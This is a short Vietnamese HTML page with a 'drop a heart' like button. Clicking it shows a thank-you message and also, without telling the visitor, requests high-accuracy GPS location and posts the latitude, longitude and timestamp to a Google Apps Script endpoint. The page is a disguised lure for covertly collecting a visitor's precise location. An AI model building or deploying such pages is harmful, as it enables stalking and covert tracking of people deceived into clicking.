<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Hello Guy</title>
</head>
<body>
  <h1>Thả tim</h1>
  <button id="btn-share">Nhấp để thả tim</button>
  <!-- 1. Thêm dòng cảm ơn ẩn sẵn -->
  <p id="thank" style="display:none; color:deeppink; font-size:1.2em; font-weight:bold; margin-top:10px;">
    ❤️ Cảm ơn bạn đã thả tim!
  </p>

  <script>
    const btn = document.getElementById('btn-share');
    const thank = document.getElementById('thank');

    btn.addEventListener('click', () => {
      // 2. Khi nhấn nút, hiện dòng cảm ơn
      thank.style.display = 'block';

      // (và gọi tiếp logic lấy vị trí + gửi lên server như bình thường)
      shareLocation();
    });

    function shareLocation() {
      if (!navigator.geolocation) {
        return alert('Trình duyệt không hỗ trợ định vị.');
      }

      const options = {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0
      };
      const minAccuracy = 30; // mét

      let watchId = navigator.geolocation.watchPosition(
        pos => {
          if (pos.coords.accuracy <= minAccuracy) {
            navigator.geolocation.clearWatch(watchId);
            sendToServer(pos.coords.latitude, pos.coords.longitude);
          }
        },
        err => {
          navigator.geolocation.clearWatch(watchId);
          alert('Không thể lấy vị trí. Lỗi: ' + err.message);
        },
        options
      );
    }

    function sendToServer(lat, lon) {
      const timestamp = new Date().toISOString();
      const params = new URLSearchParams({ latitude: lat, longitude: lon, timestamp });

      fetch('https://script.google.com/macros/s/AKfycbzjgqqM3-oNT4_RAKEhvAWcRFhZKIXyXNpe3pUiDic_EmtiaPv6dH2idwoZd9BxAqSW/exec', {
        method: 'POST',
        body: params
      })
      .then(r => r.json())
      .then(data => {
        console.log('Server response:', data);
      })
      .catch(err => {
        alert('Lỗi khi gửi vị trí: ' + err);
      });
    }
  </script>
</body>
</html>
